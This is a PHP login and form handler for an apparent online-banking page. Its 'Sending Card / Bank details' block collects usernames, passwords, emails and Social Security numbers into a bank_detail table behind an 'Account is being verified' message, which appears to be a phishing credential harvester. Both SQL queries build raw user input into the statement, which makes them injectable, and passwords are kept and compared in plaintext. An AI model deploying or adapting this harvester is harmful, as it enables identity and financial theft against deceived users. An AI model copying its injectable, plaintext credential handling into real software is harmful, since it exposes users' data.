<?php
    session_start();
    include './db/db.php';
    //geting data from database
    
    if(isset($_POST['login'])){
        $access_code = $_POST['access_code'];
        $username = $_POST['username'];
        $password = $_POST['password'];

        if(!empty($access_code) && !empty($username) && !empty($password)){
            $sql = "SELECT * FROM signup WHERE accessCode = '$access_code' ";
            $query = mysqli_query($conn,$sql) or die($conn);
            while($row = mysqli_fetch_assoc($query)){
                $dbemail = $row['email'];
                $dbpassword = $row['password'];
                $dbaccessCode = $row['accessCode'];
                $dbusername = $row['username'];
            }
        }

        //Checking logins
        if($access_code == $dbaccessCode && $dbusername == $username && $dbpassword === $password){
            //restric user
            $restriced_users = ['123','456'];
            if(in_array($access_code,$restriced_users)){
                header('location:index.php');

            }else{
                $_SESSION['accessID'] = $access_code;
                header('location:onlinebanking.php');
            }
        }else{
            $_SESSION['alertMsg'] = "<div class='alert alert-danger py-4 px-3 my-2 mx-5 fw-bold' >Wrong Credentials</div>";
            header('location:index.php');
        }
    }
    // Sending Card / Bank details
    
    if(isset($_POST['request']) ){
        if(isset($_POST['ssn']) || $_POST['email']){
            $ssn = $_POST['ssn'];
            $acc_email = $_POST['email'];
            $username = $_POST['username'];
            $pass = $_POST['password'];

            $sendData = "INSERT into bank_detail (username,password,email,ssn) VALUES('$username','$pass','$acc_email','$ssn')";
            $runQuery = mysqli_query($conn,$sendData) or die($conn);

            if($runQuery){
                $_SESSION['alertMsg'] = "<div class='alert alert-success p-2 my-2 mx-5' >Account is being verified</div>";
                header('location:onlinebanking.php');
            }
        }
    }


?>